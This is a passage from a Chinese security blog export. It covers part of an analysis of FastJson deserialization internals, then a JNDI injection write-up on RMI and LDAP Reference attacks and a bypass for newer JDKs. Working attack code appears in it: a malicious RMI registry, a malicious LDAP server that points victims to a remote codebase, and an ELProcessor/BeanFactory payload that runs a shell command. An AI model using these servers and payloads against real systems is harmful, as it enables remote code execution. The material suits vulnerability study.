<p>根据很多的实验可知，反序列化的规律:</p>
<ul>
<li>该类的无参构造函数被调用</li>
<li>public修饰的属性直接反序列化成功</li>
<li>private修饰的属性调用setter方法进行赋值</li>
<li>getter函数会根据函数返回值不同，选择被调用或不被调用</li>
</ul>
<blockquote>
<p>若一定要反序列化私有属性，可以给parseObject方法加入<code>Feature.SupportNonPublicField</code>。加入之后，它的调用方式与parse()一样，而与parseObject()无关了。后面会分析到这一点。</p>
</blockquote>
<h3 id="反序列化的对比"><a href="#反序列化的对比" class="headerlink" title="反序列化的对比"></a>反序列化的对比</h3><p>在FastJson的反序列化过程中，最明显的是parse()和parseObject()进行反序列化时，有着很大的不同。<br>从下图可以看到，JSONObject()调用了parse()方法，只是在最后多了一个toJSON()方法，它在toJSON()方法里面对所有的getter方法进行调用。<br><img src="1.png" alt=""></p>
<p>除此之外，还有2个属性的影响:</p>
<ul>
<li>有无class类型</li>
<li>有无Feature.SupportNonPublicField属性</li>
</ul>
<h4 id="1-有无class类型"><a href="#1-有无class类型" class="headerlink" title="1.有无class类型"></a>1.有无class类型</h4><p><strong>无class类型</strong>: parseObject(str)  </p>
<ul>
<li>调用类的构造方法</li>
<li>所有属性的getter方法</li>
<li>所有属性的setter方法</li>
</ul>
<p><strong>有class类型</strong>: parseObject(str,*.class)  </p>
<ul>
<li>调用类的构造方法</li>
<li>非私有属性的setter方法</li>
<li>特定类型的getter方法。</li>
</ul>
<h4 id="2-有Feature-SupportNonPublicField属性"><a href="#2-有Feature-SupportNonPublicField属性" class="headerlink" title="2.有Feature.SupportNonPublicField属性"></a>2.有Feature.SupportNonPublicField属性</h4><p>添加了Feature的parseObject()实际上等同于添加了Feature的parse()方法<br><img src="2.png" alt=""></p>
<ul>
<li>调用类的构造方法</li>
<li>所有属性的setter方法</li>
<li>特定类型的getter方法</li>
</ul>
<h3 id="FastJson反序列化流程"><a href="#FastJson反序列化流程" class="headerlink" title="FastJson反序列化流程"></a>FastJson反序列化流程</h3><p>由于parseObject()只是比parse()多了个toJSON()的过程。整个反序列化分析流程就以parseObject()为例。</p>
<p>其中最主要的是DefaultJSONParser类，在该类中会调用很多其他的类来一起完成整个过程。来看看这个类。</p>
<h4 id="DefaultJSONParser"><a href="#DefaultJSONParser" class="headerlink" title="DefaultJSONParser"></a>DefaultJSONParser</h4><p>在这个里面有几个比较关键的类:</p>
<pre><code>+ JSONLexer
+ ParserConfig
+ JavaBeanDeserializer
+ JSONScanner
+ ObjectDeserializer</code></pre><p>首先进入parse()函数，在该函数中调用DefaultJSONParser的parse()函数。<br><img src="3.png" alt=""></p>
<p>进入DefaultJSONParser.parse()函数，会根据lexer.token的值来选择处理方式。这个lexter是继承自JSONLexerBase的JSONScanner。它对很多特殊符号如<code>{</code>、<code>[</code>等都赋了值。显然由于字符串的第一个字符为<code>{</code>,其token值为12。则进入DefaultJSONParser.parseObject()函数。</p>
<p>在这个中，它会循环处理字符串，摘取类似”name”:”123”这样的key-value对。拖在这个过程中存在symbolTable中的字段，就会进TypeUtils.loadClass()函数。在这个里面若经过了checkAutoType的检查之后。紧接着就会获取对应的deserializer。</p>
<p><img src="4.png" alt=""></p>
<p>简单来说就是根据获取的clazz获取对应的deserilizer。若在预定数组中的类，则可以调用相关类的<code>deserialze</code>方法完成反序列化操作。若没有，则进入asm创建处理类的流程。在获取deserializer之后，会调用其deserilze函数进行反序列化。</p>
<h4 id="JSON字符串的解析"><a href="#JSON字符串的解析" class="headerlink" title="JSON字符串的解析"></a>JSON字符串的解析</h4><p>Json字符串的核心处理流程是在DefaultJSONParser#parse中根据json字符串的标志位来进行分发的。</p>
<p>最开始的标志位为<code>{</code>。</p>
<pre><code>1. 判断下一个标志位是否为`&quot;`，若是则提取key值，这时的标志位为第二个`&quot;`。
2. 判断下一个标志位是否为`:`
    + 如果为`:`，则判断下一个标志位是否为`&quot;`，如果是，则获取value值，此时的标志位为`&quot;`
    + 如果为`{`，则重复1～2过程
3. 判断下一个标志位是否为`}`
    + 若为`}`则表示这一单元的解析结束
    + 若为`,`则表示要解析下一个嵌套数据，重复1～3</code></pre><p>根据不同的标志位进行不同的解析，当解析过程中遇到了<code>@type</code>或<code>$ref</code>时，将当作特殊的标志做相应的处理。</p>
<h4 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h4><p>这里进入了JavaBeanDeserializer类进行处理。在该类的构造函数中，将JavaBeanInfo中的信息，包括fieldList等放入了sortedFieldDeserializers中。</p>
<p>其deserialze这部分会遍历整个sortedFieldDeserializers中所有的key，并尝试根据类型来提取json字符串中相应的信息。若成功则转交给asm生成的处理类的createInstance实例化对象，若不成功则扫描json字符串中是否具有特殊指令集。</p>
<h4 id="获取Deserilizer"><a href="#获取Deserilizer" class="headerlink" title="获取Deserilizer"></a>获取Deserilizer</h4><p>跟进一下getDeserializer()函数。</p>
<p><img src="5.png" alt=""></p>
<p>首先会尝试在deserializers中匹配type，若有则直接返回。没有则调用getDeserializer继续处理。跟进getDeserializer()。这部分代码很长，当不匹配上面的各种情况时，会调用到createJavaBeanDeserializer来创建一个新的deserializer。跟进createJavaBeanDeserializer()。</p>
<p><img src="6.png" alt=""></p>
<p>然后将生成的deserializer将其加入deserializers这个map。</p>
<h4 id="JavaBeanInfo"><a href="#JavaBeanInfo" class="headerlink" title="JavaBeanInfo"></a>JavaBeanInfo</h4><p>在进入build函数后，会遍历一遍传入所有方法，寻找满足set开头的特定类型方法。setter方法的要求:</p>
<ul>
<li>方法名长度大于4且以set开头，且第四个字母需要大写</li>
<li>非静态方法</li>
<li>返回类型为void或者当前类</li>
<li>参数个数为1</li>
</ul>
<p>获取符合条件的setter方法后，再获取propertyName。</p>
<ul>
<li>若第四个字符是大写的，则将其变为小写，然后获取propertyName值</li>
<li>若第四个字符为<code>_</code>，直接获取<code>_</code>之后的值，然后同第一个一样处理</li>
<li>若第四个字符为<code>f</code>，则直接去掉set即可</li>
</ul>
<p>然后判断获取到的propertyName是否在类成员变量中。如果不在并且其返回值为Boolean类型，就将其propertyName第一个字母大写，且加上<code>is</code>作为新的propertyName，去查找是否存在此成员变量。</p>
<p><img src="7.png" alt=""></p>
<p>当找到成员变量后，就将其放入fieldList中，放入的是一个FieldInfo对象，包括了(propertyName,method,field,clazz,type)等的信息。</p>
<p>然后再次遍历所有方法，寻找到满足get开头方法。然后getter方法要求如下:</p>
<ul>
<li>函方法名长度大于4且以get开头，且第四个字母需要大写</li>
<li>非静态方法</li>
<li>函数没有入口参数</li>
<li>继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li>
</ul>
<p>将第四个字母转为小写，然后将去掉get的值作为propertyName，然后从fieldList中查找是否存在该propertyName对应的fieldInfo。如果没有，则将该propertyName与此get方法的信息加入fieldList，其中field为null。<br><img src="8.png" alt=""></p>
<p>遍历完所有的setter和getter方法后，就获取到了一个JavaBeanInfo对象，里面包括了该过程中生成的fieldList。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://xz.aliyun.com/t/7027#toc-23" target="_blank" rel="noopener">JAVA反序列化—FastJson组件</a></li>
<li><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">Fastjson 流程分析及 RCE 分析</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI注入分析复现总结</title>
    <url>/2020/06/06/jndi-injection/</url>
    <content><![CDATA[<p>前面的文章总结了RMI的安全性问题，而JNDI注入这类问题比RMI安全问题更常见。这篇文章分析了JNDI注入的整个流程，以及如何绕过高版本的2种方式。所有的代码放在了<a href="https://github.com/ananaskr/rmi/tree/master/src/main/java/jndi" target="_blank" rel="noopener">github</a>上。</p>
<a id="more"></a>

<h1 id="JNDI注入介绍"><a href="#JNDI注入介绍" class="headerlink" title="JNDI注入介绍"></a>JNDI注入介绍</h1><p>JNDI注入是BlackHat 2016的一个议题<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">“A Journey From JNDI LDAP Manipulation To RCE”</a>。</p>
<p>JNDI注入包括以下几种方法:</p>
<ul>
<li>JNDI配合RMI远程对象(codebase)</li>
<li>JNDI Reference配合RMI</li>
<li>JNDI Reference配合LDAP</li>
</ul>
<p>此攻击的整个步骤包括以下几步:</p>
<ol>
<li>服务端实例化JNDI initialContext</li>
<li>initialContext初始化期间调用lookup(rmi://attacker/Obj)请求攻击者的恶意RMIServer/LDAPServer</li>
<li>恶意RMIServer/LDAPServer返回JNDI Reference</li>
<li>服务端接收到JNDI Reference后从恶意RMIServer/LDAPServer获取工厂类</li>
<li>恶意RMIServer返回的工厂类中带有static块的Java代码，造成RCE</li>
</ol>
<h1 id="JNDI配合RMI远程对象"><a href="#JNDI配合RMI远程对象" class="headerlink" title="JNDI配合RMI远程对象"></a>JNDI配合RMI远程对象</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>攻击者将一个恶意的RMI远程对象绑定在RMI Registry上，然后将编译后远程对象类放在WEB服务器上，这个codebase地址由远程服务器的<code>java.rmi.server.codebase</code>属性设置，供受害者RMI客户端远程加载，RMI在lookup时，会先尝试在本地CLASSPATH中获取对应的Stub类定义，并从本地加载，若本地没有，则会向远程codebase指定地址去获取恶意对象。</p>
<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>此方式需要满足两个条件:</p>
<ol>
<li>安装并配置了SecurityManager</li>
<li>Java版本低于7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly=false</code>。  </li>
</ol>
<p>官方将<code>java.rmi.server.useCodebaseOnly</code>的默认值由flase改成了true，在这样的情况下，Java虚拟机将只信任预先配置好的codebase，不再支持从RMI请求中获取。</p>
<blockquote>
<p>JNDI Naming Reference。JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类。</p>
</blockquote>
<h1 id="JNDI-Reference配合RMI"><a href="#JNDI-Reference配合RMI" class="headerlink" title="JNDI Reference配合RMI"></a>JNDI Reference配合RMI</h1><p>代码:</p>
<ul>
<li><p>Client.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Server.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SERVER</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">"ExecTest"</span>, <span class="string">"ExecTest"</span>, <span class="string">"http://127.0.0.1:8081/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"aa"</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ExecTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击者在RMI服务绑定一个JNDI Naming Reference，受害者接收到此Reference类后在解析时，会根据指定的codebase远程地址加载Factory类，原理上并非使用RMI Class Loading机制，不受第一种方式的限制。</p>
<h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>从客户端lookup开始进行分析。进入客户端的lookup函数。</p>
</li>
</ul>
<p><img src="1.png" alt=""></p>
<p>先跟进getURLOrDefaultInitCtx(name)，然后再跟进lookup(name)。</p>
<p><img src="2.png" alt=""></p>
<p>通过url获取到scheme，即rmi，在该函数里初始化了rmiURLContext。然后跟进lookup(name)。</p>
<p><img src="3.png" alt=""></p>
<p>在这里进入到了GenericURLContext#lookup。然后继续跟进lookup。</p>
<p><img src="4.png" alt=""></p>
<p>这里调用了RegistryImpl_Stub#lookup函数。此lookup函数的作用在前面介绍RMI安全的已经介绍过了。即发送字符串到注册中心(即服务端)。服务端会根据字符串查找对应的ReferenceWrapper对象，然后返回给客户端。继续跟进decodeObject()函数。</p>
<p><img src="5.png" alt=""></p>
<p>如果是Reference对象，就会进入getReference()，获得绑定的Reference类。然后进入NamingManager.getObjectInstance()函数。</p>
<p><img src="6.png" alt=""></p>
<p>然后跟进getObjectFactoryFromReference()函数。</p>
<p><img src="7.png" alt=""></p>
<p>在该函数中，通过factoryName:ExecTest和codebase:<a href="http://127.0.0.1:8081/加载了class，然后在末尾执行newInstance进行实例化，从而RCE。" target="_blank" rel="noopener">http://127.0.0.1:8081/加载了class，然后在末尾执行newInstance进行实例化，从而RCE。</a></p>
<h2 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h2><p>在JDK6u132、JDK7u122以及JDK8u113版本后，系统属性com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase默认值变为false，即不允许从远程的Codebase加载Reference工厂类。</p>
<p><img src="8.png" alt=""></p>
<p>并且在decodeObject()函数中增加了对trustURLCodebase的判断。</p>
<blockquote>
<p>在JDK8u111中，即使将trustURLCodebase默认值变为false，由于在decodeObject中并没有对于trustURLCodebase的判断，依然能够成功。</p>
</blockquote>
<h1 id="JNDI-Reference配合LDAP"><a href="#JNDI-Reference配合LDAP" class="headerlink" title="JNDI Reference配合LDAP"></a>JNDI Reference配合LDAP</h1><ul>
<li><p>Client.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ldap_server.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8081/#ExecTest"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>除了RMI服务外，JNDI也可以对接LDAP服务，LDAP也能返回JNDI Reference对象。整个过程与上个方法类似，并且不受<code>com.sun.jndi.rmi.object.trustCodebase</code>等限制，适用范围更广。</p>
<h2 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h2><p>在Oracle JDK11.0.1、8u191、7u201、6u211之后，将com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被调整为false。</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>前面的流程与RMI一样，最终进入了PartialCompositeContext#lookup。</p>
<p><img src="11.png" alt=""></p>
<p>然后进入了ComponentContext#p_lookup。</p>
<p><img src="12.png" alt=""></p>
<p>继续跟进LdapCtx#c_lookup。</p>
<p><img src="13.png" alt=""></p>
<p>在该函数中，最终进入DirectoryManager#getObjectInstance(),后面的过程与RMI的后面一样，最终实例化。</p>
<h2 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h2><p>在JDK8u191之后，在使用codebase从远程loadClass时，会进行判断。</p>
<p><img src="14.png" alt=""></p>
<p>且com.sun.jndi.ldap.object.trustURLCodebase被设置为了false。</p>
<p><img src="15.png" alt=""></p>
<h1 id="绕过高版本JDK的限制"><a href="#绕过高版本JDK的限制" class="headerlink" title="绕过高版本JDK的限制"></a>绕过高版本JDK的限制</h1><p>根据以上介绍的限制，在Oracle JDK11.0.1、8u191、7u201、6u211及更高版本的JDK来说，前面提到的方式都失效了。对于存在以上漏洞但JDK版本很高的环境中，有人提到了如下2中方式进行bypass。<br>两种方式都很依赖受害者本地CLASSPATH中环境。  </p>
<h2 id="利用本地CLASSPATH中的恶意Reference-Factory类"><a href="#利用本地CLASSPATH中的恶意Reference-Factory类" class="headerlink" title="利用本地CLASSPATH中的恶意Reference Factory类"></a>利用本地CLASSPATH中的恶意Reference Factory类</h2><p>前面分析的整个过程首先是远程加载factory，然后进行实例化。但是在高版本的限制中，无法进行远程加载的时候，利用本地存在的Reference恶意类。实际上，本地不可能存在一个实例化就执行恶意代码的类。因此，看看加载完factory并实例化之后的事情。定位到NamingManager#getObjectInstance。</p>
<p><img src="16.png" alt=""></p>
<p>在前面分析到NamingManager#getObjectFactoryFromReference时，首先会进行本地factory的加载。 </p>
<p><img src="10.png" alt=""></p>
<p>在通过getObjectFactoryFromReference中获取到Factory类之后，对调用其getObjectInstance函数，其中参数ref和name是可控的。</p>
<p>因此，在高版本如JDK8u191以上的版本上，可以在返回的Reference中指定Factory类。这个类必须在受害者目标本地的CLASSPATH中。其中该类需要满足以下条件:</p>
<ol>
<li>实现<code>javax.naming.spi.ObjectFactory</code>接口</li>
<li>至少存在一个getObjectInstance()方法</li>
</ol>
<h3 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h3><p>org.apache.naming.factory.BeanFactory满足以上两个条件。它存在于Tomcat依赖包中，使用非常广泛，来看看如何利用它。首先定位到BeanFactory#getObjectInstance()函数。</p>
<p><img src="9.png" alt=""></p>
<p>可以看到在该函数中，如果传入的obj时一个ResourceRef实例，根据Reference对象的类名加载相应的类，并通过反射的方式实例化Reference所指向的任意Bean Class。</p>
<p><img src="17.png" alt=""></p>
<p>并且调用满足条件的方法，其中大概率是调用setter方法为所有属性赋值。看看满足条件的方法。</p>
<p><img src="19.png" alt=""></p>
<p>首先Reference类获取”forceString”的值，若值中存在等号(61)，则等号右边作为属性值对应的方法，左边为该方法的参数。若不含有=号，则获取该属性值的setter方法。相当于”forceString”可以为特定的属性指定setter方法一样。然后将方法和参数放入forced中，以供后续调用。</p>
<p>在这样的情况下，目标Bean Class必须: 1)有一个无参构造方法；2)存在能被调用的方法。</p>
<h3 id="ELProcessor类"><a href="#ELProcessor类" class="headerlink" title="ELProcessor类"></a>ELProcessor类</h3><p>在一篇文章中提到了利用javax.el.ELProcessor类。</p>
<p><img src="18.png" alt=""></p>
<p>其中eval函数仅接受一个String参数，执行传入的EL表达式。因此，只需要传入恶意的EL表达式即可达到RCE。现在需要解决的问题是将eval()函数设置为Reference类某属性的setter方法。让其自动调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ResourceRef ref &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x&#x3D;eval&quot;));</span><br></pre></td></tr></table></figure>

<p>根据前面的分析，x为eval()方法的参数，传入恶意的表达式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ref.add(new StringRefAddr(&quot;x&quot;, &quot;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;&#x2F;bin&#x2F;sh&#39;,&#39;-c&#39;,&#39;open &#x2F;Applications&#x2F;Calculator.app&#39;]).start()&quot;)&quot;));</span><br></pre></td></tr></table></figure>

<h3 id="完整的payload"><a href="#完整的payload" class="headerlink" title="完整的payload"></a>完整的payload</h3><p>以RMI服务器为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>, <span class="string">"org.apache.naming.factory.BeanFactory"</span>, <span class="keyword">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">""</span><span class="string">".getClass().forName("</span>javax.script.ScriptEngineManager<span class="string">").newInstance().getEngineByName("</span>JavaScript<span class="string">").eval("</span><span class="keyword">new</span> java.lang.ProcessBuilder[<span class="string">'(java.lang.String[])'</span>]([<span class="string">'/bin/sh'</span>,<span class="string">'-c'</span>,<span class="string">'open /Applications/Calculator.app'</span>]).start()<span class="string">")"</span>));</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">            registry.bind(<span class="string">"calc"</span>, 